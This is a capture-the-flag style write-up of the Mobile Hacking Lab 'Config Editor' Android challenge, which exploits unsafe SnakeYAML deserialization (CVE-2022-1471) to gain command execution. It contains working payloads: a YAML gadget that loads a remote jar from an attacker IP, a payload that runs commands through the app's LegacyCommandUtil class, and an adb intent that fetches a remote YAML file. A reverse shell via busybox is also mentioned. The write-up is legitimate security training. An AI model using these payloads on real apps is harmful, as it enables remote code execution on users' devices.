---
layout: post
title: Config Editor Challenge
date: 2024-08-29 00:39 -0400
img_path: /assets/img/configEditor/
published: true
categories: ["Mobile Challenge","Mobile Hacking Lab"]
tags: ["Deserialization attacks", "Static analysis","RCE"]
toc: true
---


Achieve Remote Code Execution via a Config Editor app in Android by exploiting vulnerabilities in a third party library.

## Methodology

1. Analyze the application’s code with reverse engineering tools to understand its interaction with the third-party library.
2. Identify the vulnerability within the library and devise a strategy to exploit it.
3. Develop a malicious payload tailored to exploit the specific vulnerability in the library.
4. Execute the payload to achieve code execution on the device running the application.

## Challenge Walkthrough 

First, we start as always extracting the apk from the application and reversing with jadx-gui 

```sh
adb shell pm path com.mobilehackinglab.configeditor
package:/data/app/~~7nJyEbpomszhvZKacYpBDQ==/com.mobilehackinglab.configeditor-Xlgn336TGw-b6-q5Xmjmyg==/base.apk

> adb pull /data/app/~~7nJyEbpomszhvZKacYpBDQ==/com.mobilehackinglab.configeditor-Xlgn336TGw-b6-q5Xmjmyg==/base.apk configEditor.apk
```

From the AndroidManfiest, call my atention an activity with this *intent-filter* configuration 
```xml
            <intent-filter>
                <action android:name="android.intent.action.VIEW"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <category android:name="android.intent.category.BROWSABLE"/>
                <data android:scheme="file"/>
                <data android:scheme="http"/>
                <data android:scheme="https"/>
                <data android:mimeType="application/yaml"/>
            </intent-filter>
```

launching the application we saw two buttons, **Load**/**Save**, and a text content. Until now these seems to me some kind of deserialization attack vector with the ``yml`` file as an input but lets find the code that manage the Load/Save funcionality. 



First we found the button code 
```java
    public static final void setButtonListeners$lambda$3(MainActivity this$0, Uri uri) {
        Intrinsics.checkNotNullParameter(this$0, "this$0");
        if (uri != null) {
            this$0.loadYaml(uri);
        }
    }
     public static final void setButtonListeners$lambda$6(MainActivity this$0, Uri uri) {
        Intrinsics.checkNotNullParameter(this$0, "this$0");
        if (uri != null) {
            this$0.saveYaml(uri);
        }
    }   
```

Lets follow that ``loadYaml`` function, and how its implementented. ``loadYaml`` became more important at first look than ``saveYaml`` because its use *desertialization* functionality :O 

```java
    public final void loadYaml(Uri uri) {
        try {
            ParcelFileDescriptor openFileDescriptor = getContentResolver().openFileDescriptor(uri, "r");
            try {
                ParcelFileDescriptor parcelFileDescriptor = openFileDescriptor;
                FileInputStream inputStream = new FileInputStream(parcelFileDescriptor != null ? parcelFileDescriptor.getFileDescriptor() : null);
                DumperOptions $this$loadYaml_u24lambda_u249_u24lambda_u248 = new DumperOptions();
                $this$loadYaml_u24lambda_u249_u24lambda_u248.setDefaultFlowStyle(DumperOptions.FlowStyle.BLOCK);
                $this$loadYaml_u24lambda_u249_u24lambda_u248.setIndent(2);
                $this$loadYaml_u24lambda_u249_u24lambda_u248.setPrettyFlow(true);
                Yaml yaml = new Yaml($this$loadYaml_u24lambda_u249_u24lambda_u248);
                Object deserializedData = yaml.load(inputStream);
                String serializedData = yaml.dump(deserializedData);
                ActivityMainBinding activityMainBinding = this.binding;
                if (activityMainBinding == null) {
                    Intrinsics.throwUninitializedPropertyAccessException("binding");
                    activityMainBinding = null;
                }
                activityMainBinding.contentArea.setText(serializedData);
                Unit unit = Unit.INSTANCE;
                Closeable.closeFinally(openFileDescriptor, null);
            } finally {
            }
        } catch (Exception e) {
            Log.e(TAG, "Error loading YAML: " + uri, e);
        }
    }
```

The Yaml object defined in 220 line came from the library ``org.yaml.snakeyaml.Yaml`` so lets search more about this library implementation. 

Inmediatly appear [this](https://snyk.io/blog/unsafe-deserialization-snakeyaml-java-cve-2022-1471/) article from snyk talking about CVE-2022-1471 an Unsafe deserialization in snakeYaml 

So theres is a big possibility this is the approach to the challenge, lets try to build a functional PoC for this vulnerability.

[This paper](https://www.mscharhag.com/security/snakeyaml-vulnerability-cve-2022-1471) help me a lot to understand the vulnerability and the payload that we could use in this scenario.
```yml
food: !!javax.script.ScriptEngineManager [
    !!java.net.URLClassLoader [[
        !!java.net.URL [http://<ip>/malicious-code.jar]
    ]]
]
```

but what is inside the *.jar* file, Well first let make sure this payload reach our local machine or a VPS or a BurpCollaborator Domain. 

![Error](image.png)

The key in this message is ``Companion: Can't construct a java object for tag:yaml.org,2002:javax.script.ScriptEngineManager; exception
=Class not found: javax.script.ScriptEngineManager`` theres is no ScriptEngineManage class

Looking deep at the code decompiled i notice a ``LegacyCommandUitl`` class very convinent to our exploit 

![alt text](image-1.png)

Now we adjust our payload to 

```yml
foo: !!com.mobilehackinglab.configeditor.LegacyCommandUtil [ ping -c 1 10.11.3.2 ]
```

With this payload i use the laod button to charge a yml file put it in the storage

```sh
adb push payload.yml /storage/emulated/0/Download/paylaod3.yml
```

![Loading](image-2.png)

Sniffing the ICMP traffic inside the VPN connection we successfully achive remote command execution. 

![RCE](image-3.png)

Now I notice i was not using the exported activity we find inside the AndoridManifest, so this approach will not suitable for an attacker point of view, The hacker will exploit the exported activity, lets make an example with adb 

```sh
adb shell am start -a android.intent.action.VIEW -d "http://10.11.3.2:9090/pwned.yaml" -t "application/yaml" -n com.mobilehackinglab.configeditor/.MainActivity
```

TO get a reverseh shell on android, most easy way is using some kind of netcat for android, searching on google appear that the tools is **busybox**, lucky for us is already installed in the corellium device. 

![ggs](image-5.png)